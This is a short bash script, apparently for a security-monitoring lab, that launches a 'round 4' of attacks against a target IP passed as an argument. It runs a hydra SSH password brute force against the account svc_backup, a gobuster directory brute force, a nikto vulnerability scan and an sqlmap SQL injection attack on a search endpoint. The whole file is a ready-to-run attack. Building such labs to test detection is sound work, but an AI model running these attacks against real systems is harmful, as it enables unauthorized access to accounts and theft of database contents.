#!/bin/bash
# Round 4: attacks using REAL industry-standard pentest tools, not hand-written curl loops.
# Run FROM the manager against soc-target's external IP.
TARGET_IP="$1"
echo "=== TOOLATTACK_START $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ) ==="

echo "--- [T1] hydra SSH brute force with a real password wordlist (svc_backup, real password IS in the list) ---"
timeout 120 hydra -l svc_backup -P /tmp/passlist.txt -t 4 -f "ssh://$TARGET_IP" 2>&1 | tail -6

echo "--- [T2] gobuster directory brute force with dirb common.txt wordlist ---"
timeout 120 gobuster dir -u "http://$TARGET_IP" -w /usr/share/dirb/wordlists/common.txt -q -t 20 2>&1 | tail -10

echo "--- [T3] nikto full web vulnerability scan ---"
timeout 180 nikto -h "http://$TARGET_IP" -maxtime 150 2>&1 | tail -15

echo "--- [T4] sqlmap automated SQL injection against the vulnerable search endpoint ---"
timeout 180 sqlmap -u "http://$TARGET_IP/search?q=widget" --batch --level=2 --risk=2 --flush-session 2>&1 | tail -12

echo "=== TOOLATTACK_END $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ) ==="
